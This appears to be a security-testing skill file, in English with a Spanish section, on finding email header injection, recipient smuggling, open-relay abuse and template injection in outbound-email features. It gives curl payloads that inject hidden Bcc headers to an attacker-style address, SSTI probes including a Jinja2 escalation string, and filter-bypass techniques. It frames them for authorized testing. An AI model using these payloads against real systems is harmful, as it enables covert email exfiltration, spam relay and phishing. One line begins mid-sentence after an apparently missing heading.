---
name: email-injection
description: >
  Hunt for email injection: SMTP header injection via CRLF in email-
  composing fields (to/from/subject), additional-recipient/BCC injection,
  and server-side template injection (SSTI) inside email-rendering
  templates (name/subject fields fed into a template engine before
  sending). Use on contact forms, "share this", invite-a-friend, or any
  feature that triggers an outbound email with user-controlled fields.
  Keywords: email injection, SMTP injection, header injection, BCC
  injection, template injection, SSTI, mail relay abuse.
  Do NOT use for the general CRLF-in-HTTP-response vector — use
  crlf-injection; this skill is specifically about the mail-
  composition sink (SMTP or templated email body).
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-93, CWE-94, CWE-1336]
  mitre_attack: [T1566, T1190]
  tools: [burpsuite, curl, swaks]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [crlf-injection, password-reset]
---

## Signals

- Contact forms, "invite a friend", "share via email", feedback forms, or any feature that triggers a server-sent email containing user-supplied fields (name, subject, message).
- Email "From" display name or reply-to derived from a user-submitted field.
- Password-reset/notification emails built from a template engine with user-controlled interpolation (name field rendered inside the email HTML/text).
- The app exposes its own outbound mail relay/sending endpoint directly (rare but high-impact: open-relay-style abuse).

## Prerequisites

- A test inbox you fully control to receive and inspect raw email source (headers included) — critical, since webmail clients often hide/normalize headers the same way browsers hide raw HTTP headers.
- Explicit scope confirmation that outbound-email testing is authorized — sending unexpected emails (even to your own test inbox via the target's infra) touches third-party mail infrastructure and deliverability reputation; respect any volume limits agreed with the operator.

## Methodology

1. **Baseline a legitimate send.** Submit the form/feature normally, receive the email, and view its **raw source** (not the rendered view) in your test mailbox to see exactly how each field maps to headers/body:
   ```bash
   # most webmail clients have a "show original"/"view source" option — always use it
   ```

2. **CRLF header injection in composition fields.** Inject CRLF into any field that becomes part of an email header (name, subject, reply-to):
   ```bash
   curl -s -i -X POST https://target.com/contact -d "name=Test%0d%0aBcc:attacker@yourdomain.com&email=test@yourdomain.com&message=hello"
   curl -s -i -X POST https://target.com/contact -d "email=test@yourdomain.com%0d%0aBcc:attacker@yourdomain.com&name=Test&message=hello"
   curl -s -i -X POST https://target.com/contact -d "subject=Hi%0d%0aX-Injected-Header:%201&name=Test&email=test@yourdomain.com&message=hello"
   ```
   Check your test inbox's raw source for the injected `Bcc:`/`X-Injected-Header:` actually landing as a real header (proof the mail library didn't sanitize) vs. appearing as literal text in the body (sanitized, N/A).

3. **Additional recipient injection (BCC/CC smuggling).** If the app builds the `To`/`Cc`/`Bcc` header from a user field (e.g. "send a copy to yourself" feature with a free-text email field), test multi-recipient injection:
   ```bash
   curl -s -i -X POST https://target.com/share -d "recipient_email=victim@test.com%0d%0aCc:attacker@yourdomain.com&content_id=123"
   curl -s -i -X POST https://target.com/share -d "recipient_email=victim@test.com,attacker@yourdomain.com&content_id=123"
   ```

4. **Open-relay / arbitrary-recipient abuse.** If the feature's purpose is narrow (e.g. "email me this receipt") but the recipient field is actually fully attacker-controlled server-side, check whether arbitrary external addresses can be used to relay spam/phishing through the target's trusted mail infrastructure:
   ```bash
   curl -s -i -X POST https://target.com/send-receipt -d "order_id=123&email=arbitrary-external@notmyinbox.com"
   ```
   This is high-impact if confirmed (reputational/deliverability abuse of the target's domain) — only pursue with explicit scope, and avoid actually spamming third parties; send only to your own additional controlled test addresses.

5. **Subject/body template injection (SSTI).** If the email body/subject is rendered through a template engine (Jinja2, Handlebars, Freemarker, Velocity) with user input interpolated unsafely, probe with engine-specific syntax in the name/message field:
   ```bash
   curl -s -i -X POST https://target.com/contact -d "name={{7*7}}&email=test@yourdomain.com&message=hello"
   curl -s -i -X POST https://target.com/contact -d "name=\${7*7}&email=test@yourdomain.com&message=hello"
   curl -s -i -X POST https://target.com/contact -d "name=#{7*7}&email=test@yourdomain.com&message=hello"
   ```
   Check the **received email body** (not the web response) for `49` instead of the literal payload — SSTI here often doesn't reflect in the HTTP response at all, only in the asynchronously-sent email, so you must check the inbox, not just curl's output.

6. **SMTP-level injection via a dedicated mail-testing tool**, if you have direct access to an SMTP endpoint the app uses (rare in black-box testing, more common in gray-box/internal engagements):
   ```bash
   swaks --to test@yourdomain.com --from "attacker@target.com" --header "Subject: test" \
     --body "test body with injected header attempt" --server smtp.target.com
   ```

7. **Confirm impact precisely.** For header injection, the concrete impact is usually: covert BCC exfiltration of the email to an attacker address, or spoofed sender/subject enabling more convincing phishing using the target's own trusted mail-sending reputation. State which one you actually achieved.

## Tooling

- A test mailbox with raw-source viewing (Gmail "Show original", or a self-hosted test mail catcher like MailHog/Mailtrap if available for the engagement).
- `curl` for form submission with injected payloads.
- `swaks` for direct SMTP-level testing when a mail server endpoint is directly reachable in scope.

## Payloads & Detection Patterns

Guía de caza: una familia por sink de composición (header SMTP vs cuerpo/subject templado). El
resultado casi nunca vuelve en la respuesta HTTP: la prueba vive en el **raw source** del inbox
que controlas. Usa una dirección/marcador único por intento para dedup.

| Categoría | Shape | Propósito |
|---|---|---|
| SMTP header CRLF | `name=Test%0d%0aBcc:probe@yourdomain.com` | Añadir `Bcc`/`Cc` oculto (exfil del correo) |
| Extra recipient | `victim@x%0d%0aCc:attacker@x`, `a@x,b@x` | Smuggling de destinatario adicional |
| Header override | `subject=Hi%0d%0aX-Injected:%201` | Inyectar/sobrescribir un header arbitrario |
| Sender spoof | `reply-to`/`from` con CRLF → `From:` forjado | Phishing con la reputación del dominio |
| Arbitrary recipient | recipient field con externo no relacionado | Relay/spam vía infra de mail del target |
| SSTI subject/body | `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` | Template injection en el mail renderizado |
| SSTI escalation | Jinja2 `{{config}}`, `{{self.__init__.__globals__}}` | Escalar a lectura/exec (gate operador) |

Surface signals que delatan la clase antes de inyectar:
- Features: contacto, "invitar amigo", "compartir por email", reset de password, notificaciones.
- Campos `name`, `subject`, `reply_to`, `recipient_email` que acaban en headers/cuerpo del correo.
- El efecto NO aparece en la respuesta HTTP → hay que leer el raw source del inbox ("ver original").
- Motor de template detectable por error filtrado (`jinja2`, `Freemarker`, `Velocity`, `Handlebars`).

```bash
# header injection: confirmar en el RAW SOURCE del inbox, no en la respuesta HTTP
P="probe+$(date +%s)@yourdomain.com"
curl -s -X POST https://target/contact \
  --data-urlencode "name=Test%0d%0aBcc:$P" --data-urlencode "email=test@yourdomain.com" \
  --data-urlencode "message=hi"
# abrir el correo recibido → "ver original" → el Bcc como header real = hit (vs literal en body = N/A)
```

```bash
# SSTI: el resultado evaluado aparece en el CUERPO del correo enviado, no en curl
for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>'; do
  curl -s -X POST https://target/contact \
    --data-urlencode "name=$p" --data-urlencode "email=test@yourdomain.com" --data-urlencode "message=hi"
done   # revisar inbox: 49 (no el literal) = SSTI Demonstrated
```

Vector ciego (el correo no vuelve a ti, p. ej. relay a tercero o preview remoto): incrusta el
`payload_url` de un token OAST (`engine.oast`) en un campo que el motor pueda fetchar y correlaciona
el callback; sin ese hit, queda **Inferred**.

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| Strip de `\r\n` | Solo-LF `%0a` en vez de `%0d%0a` | Sendmail/qmail aceptan LF como separador |
| Sanitiza name/subject | Inyectar vía `email`/`reply-to` field | No todos los campos pasan por la misma validación |
| Mail lib con header API segura | Buscar concatenación manual pese a la API | El misuse del dev sigue siendo explotable |
| Allowlist de recipient | Multi-recipient con coma/semicolon `a@x,b@x` | El parser SMTP expande la lista |
| Filtro de `{{ }}` | Sintaxis alterna `${}`, `#{}`, `<%= %>` según motor | Probar todas las familias de template |
| Match textual del payload | Encoded-word/quoted-printable/UTF-7 en header | Evade la comparación literal del WAF |

 of user input instead of using a mail library's structured header API (which validates/rejects CR/LF in header values).
- Recipient fields derived from user-controlled input with no allow-list against the account's own verified email.
- Email body/subject rendered via a template engine with user input treated as template source instead of as data (classic SSTI root cause, just in an email-sending context instead of a web response).

## Validation Gate (minimum proof)

- Raw email source (headers included) from your own test inbox showing the injected header (`Bcc:`, `X-Injected:`) parsed as a genuine distinct header by the receiving mail server — a payload merely appearing as literal text in the body is not proof.
- For SSTI: the received email body showing the evaluated expression result (e.g. `49`), captured from the actual email, not assumed from the HTTP response.
- For open-relay/arbitrary-recipient abuse: proof the email was delivered to an address with no legitimate relationship to the submitting account/session, using only your own controlled addresses.

## Gotchas

- **Minimum proof:** the HTTP response alone almost never shows the email-injection result — you must check the actual delivered email's raw source; closing this skill out without ever looking at raw email headers is incomplete testing.
- **Common N/A:** app uses a modern mail library (e.g. recent `PHPMailer`, `nodemailer`, `Django EmailMessage`) that validates/rejects CR/LF in header-bound fields by default — confirm via the raw-source check rather than assuming from the library name, since misuse (manually concatenating headers despite having a safe API available) is still possible.
- **Overclaim trap:** reflected `{{7*7}}` appearing unevaluated as literal text in the email is not SSTI — only report if the evaluated result appears.
- Respect mail-sending volume/scope limits — this skill inherently sends real emails through the target's infrastructure; don't loop large payload lists through a live mail-sending feature without checking the engagement's rate/volume expectations first.
- Never use real third-party victim addresses for open-relay/BCC tests — use only addresses you control.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Header injection to spoofing** — Can injected CRLF in email fields add Bcc/From headers to spoof sender identity or spam third parties?
2. **SSRF via email preview** — If the app renders link previews or fetches remote content from email bodies, does this enable SSRF?
3. **Stored XSS in email templates** — Does injected content render unsanitized in HTML email templates viewed by staff/admins?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- SMTP header injection → covert BCC exfiltration of password-reset/notification emails, chain with password-reset for the full account-takeover narrative.
- Same CRLF root-cause family as HTTP header injection — cross-reference crlf-injection when the app reuses the same unsafe concatenation helper in both HTTP and email contexts.
- Open-relay abuse → reputational/deliverability impact, relevant for business-impact framing in the final report even without a direct technical takeover chain.
- SSTI in email body → if the same template engine is used server-side for other rendering (not just email), check whether the SSTI reaches a context with filesystem/process access for RCE — escalate only with an operator gate.
